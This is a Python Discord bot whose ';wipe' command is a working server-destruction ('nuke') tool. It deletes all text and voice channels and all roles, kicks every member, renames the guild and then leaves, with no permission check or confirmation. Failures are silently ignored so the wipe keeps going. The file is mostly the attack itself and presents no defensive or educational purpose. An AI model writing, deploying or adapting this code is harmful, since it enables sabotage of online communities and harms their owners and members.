import discord
from discord.ext import commands

intents = discord.Intents.default()
intents.members = True

bot = commands.Bot(command_prefix=';', intents=intents)

print('- BOT ONLINE -\n')

@bot.command()
async def test(ctx, *, name=''):
    await ctx.reply('pass ' + name)

@bot.command()
async def wipe(ctx, *, actname='none'):
    c = 0
    # NOTIFY
    author = ctx.message.author
    id = ctx.guild.id
    print("[🔔] WIPING SERVER ID: " + str(id) + " - by: '" + str(author) + "'")
    # LISTS
    members = len(ctx.guild.members)
    tChannels = len(ctx.guild.text_channels)
    vChannels = len(ctx.guild.voice_channels)
    roles = len(ctx.guild.roles)

    # TC
    print('\nRemoving TChannels . . .')
    while (c-1) < tChannels:
        try:
            cTChannel = ctx.guild.text_channels[0]
            await cTChannel.delete()
        except:
            pass
        c += 1
    print('Removed ' + str(c) + ' text channel(s)')
    c = 0
    # VC
    print('\nRemoving VChannels . . .')
    while (c-1) < vChannels:
        try:
            cVChannel = ctx.guild.voice_channels[0]
            await cVChannel.delete()
        except:
            pass
        c += 1
    print('Removed ' + str(c) + ' voice channel(s)')
    c = 0

    # R
    fail = 0
    print('\nRemoving Roles . . .')
    while c < roles:
        try:
            cRoles = ctx.guild.roles[c]
            await cRoles.delete()
        except:
            pass
        c += 1
    print('Removed ' + str(c) + ' role(s)')
    c = 0

    # MKick
    print('\nKicking . . .')
    while c < members:
        try:
            cUsers = ctx.guild.members[c]
            print('USER: ' + str(cUsers))
            await cUsers.kick()
            print('KICKED')
        except:
            print('FAIL')
            fail += 1
        c += 1

    print('Kicked ' + str(c - fail) + ' user(s)')
    print('Failed to kick ' + str(fail) + ' user(s)')
    c = 0

    if len(actname) >= 2 and len(actname) <= 32 and actname != 'none':
        print("\nChanged server name to '" + actname + "'")
        await ctx.guild.edit(name=actname)
    else:
        print("\nServer's name remains unchanged")

    await ctx.guild.leave()
    print('[💨] Bot left\n')

#TOKEN#TOKEN#TOKEN#TOKEN#TOKEN#TOKEN#TOKEN#TOKEN#TOKEN#TOKEN
bot.run('')
